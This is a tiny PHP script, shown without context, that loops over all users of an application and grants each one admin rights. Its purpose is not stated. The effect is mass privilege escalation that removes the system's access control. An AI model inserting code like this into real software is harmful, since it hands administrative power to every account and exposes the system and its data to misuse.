<?php

foreach (user::all() as $user) {
    $user->setRights('admin', 1);
    $user->save();
}
?>
